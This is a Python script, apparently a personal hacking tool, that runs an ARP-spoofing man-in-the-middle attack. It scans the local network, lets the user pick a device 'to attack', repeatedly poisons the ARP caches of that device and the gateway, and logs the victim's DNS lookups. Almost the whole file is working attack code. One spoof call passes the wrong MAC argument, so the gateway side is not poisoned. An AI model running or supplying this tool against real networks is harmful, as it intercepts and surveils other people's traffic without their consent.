from scapy.all import ARP, Ether, sendp, srp, conf, get_if_hwaddr, sniff, DNSQR, IP
from time import  sleep, strftime, localtime
import socket
import sys
import signal
import ctypes
from threading import Thread
from colorama import Fore, Style, init
init(autoreset=True)

# הגדרות כלליות
conf.verb = 0  # הסתרת פלטים מיותרים

# קבלת כתובת ה-IP המקומית
def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('8.8.8.8', 80))
        return s.getsockname()[0]
    finally:
        s.close()

#קבלת כתובת הראוטר
def get_default_gateway():
    return conf.route.route('0.0.0.0')[2]

#קבלת כתובת של הרשת
def get_network_subnet():
    local_ip = get_local_ip()
    return '.'.join(local_ip.split('.')[:3]) + '.0/24'

# סריקת הרשת והחזרת רשימת IP פעילים
def scan_network(network):
    print(f"\n{Fore.MAGENTA}🔍 Scanning network: {Fore.YELLOW}{network}")
    arp_request = ARP(pdst=network)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = broadcast / arp_request
    ans, _ = srp(packet, timeout=2, verbose=0)

    devices = []
    for send, received in ans:
        devices.append({'ip': received.psrc, 'mac': received.hwsrc})
    return devices


# הצגת רשימת כתובות IP לבחירה
def choose_target(devices):
    print(f"{Fore.MAGENTA}📋 Devices found on the network: \n")
    for i, device in enumerate(devices):
        print(f"{Fore.CYAN}{i + 1}. {device['ip']}")

    while True:
        try:
            choice = int(input(f"\n{Fore.YELLOW}🎯 Choose a device to attack (number) "))
            if 1 <= choice <= len(devices):
                selected_ip = devices[choice - 1]['ip']
                print(f"{Fore.GREEN}✅ Selected target: {selected_ip}")
                return devices[choice -1]
            else:
                print(f"{Fore.RED}❌ Invalid choice, try again. ")
        except ValueError:
            print(f"{Fore.RED}❌ Please enter a valid number. ")

# קבלת כתובת MAC לפי IP
def get_mac(ip):
    print(f"{Fore.GREEN}[*] Trying to find the MAC for {ip}")
    arp_request = ARP(pdst=ip)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp_request
    ans, _ = srp(packet, timeout=2, retry=3)
    for sent, received in ans:
        print(f"{Fore.GREEN}[*] Found MAC: {received.hwsrc} for IP {ip}")
        return received.hwsrc
    print(f"{Fore.RED}❌ Didn't found the MAC for {ip}")
    return None


# שליחת פקטת ARP מזויפת
def spoof(target_ip, spoof_ip, target_mac, attacker_mac):
    packet = Ether(dst=target_mac) / ARP(op=2,psrc=spoof_ip,hwsrc=attacker_mac,pdst=target_ip,hwdst=target_mac)
    sendp(packet, verbose=False)

# שחזור המצב לרשת המקורית
def restore(dest_ip, src_ip, dest_mac, src_mac):
    packet = Ether(dst=dest_mac) / ARP(op=2,psrc=src_ip,hwsrc=src_mac,pdst=dest_ip,hwdst=dest_mac)
    sendp(packet, count=5, verbose=False)

# עצירה מסודרת
def stop_attack(signal, frame):
    print(f"\n{Fore.YELLOW}[*] Restores network status...")
    restore(target_ip, gateway_ip, target_mac, router_mac)
    restore(gateway_ip, target_ip, router_mac, target_mac)
    print(f"{Fore.GREEN}[*] Network restore completed Exiting.")
    sys.exit(0)

# סניפר שמדפיס שמות דומיין שהקורבן מנסה לגשת אליהם
def sniff_packets():
    def process_packet(packet):
        if packet.haslayer(DNSQR) and packet.haslayer(IP):
            if packet[IP].src == target_ip:
                domain = packet[DNSQR].qname.decode()
                time = strftime("%m/%d/%Y %H:%M:%S", localtime())
                print(f'[{Fore.GREEN}{time} | {Fore.BLUE}{target_ip} -> {Fore.RED}{domain}{Style.RESET_ALL}]')

    print(f"{Fore.GREEN}[*] Listens for DNS requests from the victim ...")
    sniff(filter=f"udp port 53 and src {target_ip}", prn=process_packet, store=0)


#הקוד מתחיל כאן 🔽
if __name__ == "__main__":
    print(rf"""{Fore.LIGHTWHITE_EX}
    ___    __                        ____       __                       __        
   /   |  / /_  _________  ____     / __ \_____/ /__________ _   _______/ /____  __
  / /| | / __ \/ ___/ __ \/ __ \   / / / / ___/ __/ ___/ __ \ | / / ___/ //_/ / / /
 / ___ |/ / / / /  / /_/ / / / /  / /_/ (__  ) /_/ /  / /_/ / |/ (__  ) ,< / /_/ / 
/_/  |_/_/ /_/_/   \____/_/ /_/   \____/____/\__/_/   \____/|___/____/_/|_|\__, /  
                                                                          /____/ """)
    print(f"\n{Fore.LIGHTWHITE_EX}****************************************************************")
    print(f"\n{Fore.LIGHTWHITE_EX}* Copyright of Ahron Ostrovsky, 2025                           *")
    print(f"\n{Fore.LIGHTWHITE_EX}* www.instagram.com/ahron_ostrovsky                            *")
    print(f"\n{Fore.LIGHTWHITE_EX}* https://www.youtube.com/Ahron_ostrovsky                      *")
    print(f"\n{Fore.LIGHTWHITE_EX}****************************************************************")

    local_ip = get_local_ip()
    gateway_ip = get_default_gateway()
    network_subnet = get_network_subnet()

    print(f"{Fore.CYAN}📡 Local IP: {Fore.YELLOW}{local_ip}")
    print(f"{Fore.CYAN}🌐 Gateway IP: {Fore.YELLOW}{gateway_ip}")
    print(f"{Fore.CYAN}🧠 Network Range: {Fore.YELLOW}{network_subnet}")

    devices = scan_network(network_subnet)
    if not devices:
        print("{Fore.RED}😕 No devices found")
        sys.exit(0)

    selected = choose_target(devices)
    target_ip = selected['ip']
    target_mac = selected['mac']
    router_mac = get_mac(gateway_ip)
    attacker_mac = get_if_hwaddr(conf.iface)

    # טיפול ב-Ctrl+C
    signal.signal(signal.SIGINT, stop_attack)

    # הפעלת סניפר ברקע
    sniffer_thread = Thread(target=sniff_packets, daemon=True)
    sniffer_thread.start()

    print(f"{Fore.GREEN}[*] Starting MITM attack on {target_ip}, Press Ctrl+C to pause 🚀")
    while True:
        spoof(target_ip, gateway_ip, target_mac, attacker_mac)
        spoof(gateway_ip, target_ip, router_mac, target_mac)
        sleep(5)